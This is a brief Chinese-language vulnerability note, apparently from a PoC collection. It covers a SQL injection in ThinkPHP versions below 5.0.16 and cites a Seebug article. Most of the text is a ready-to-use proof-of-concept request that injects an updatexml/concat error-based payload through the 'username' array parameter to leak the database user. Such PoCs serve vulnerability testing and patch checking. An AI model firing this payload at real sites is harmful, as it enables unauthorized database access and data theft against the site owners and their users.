## Thinkphp框架 < 5.0.16 存在sql注入

### Reference

* https://paper.seebug.org/564/

-------------
### poc

```
ip/index.php/index/index/testsql?username[0]=inc&username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&username[2]=1
```

